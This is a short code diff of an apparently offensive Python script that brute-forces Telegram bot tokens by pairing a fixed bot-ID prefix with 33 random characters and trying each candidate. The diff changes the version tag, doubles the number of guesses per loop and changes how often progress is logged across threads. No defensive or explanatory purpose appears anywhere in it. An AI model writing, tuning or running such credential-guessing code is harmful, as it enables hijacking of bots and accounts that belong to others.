@@ -1,6 +1,6 @@
-#ADMlNxd 2.007
+#ADMlNxd 2.006
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
-for k in range(500):
+for k in range(1000):
   token = "609517172:AA" + "".join(random.choices(chars,k=33))
   new_bot = Bot(token)
   try:
@@ -18,5 +18,5 @@ for k in range(500):
     LOGGING("🚩 JAI SHREE RAM\n"*20)
   if botNo == THREAD_COUNT - 1:
     ATTEMPT += 1
-    if ATTEMPT % 1000 == 0:
+    if ATTEMPT % 500 == 0:
       LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
